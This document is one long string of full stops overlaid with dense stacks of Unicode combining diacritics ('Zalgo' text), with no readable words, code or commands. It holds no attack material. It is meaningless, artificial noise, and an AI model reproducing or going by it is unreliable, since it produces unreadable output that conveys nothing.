̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̤̏ͮ̿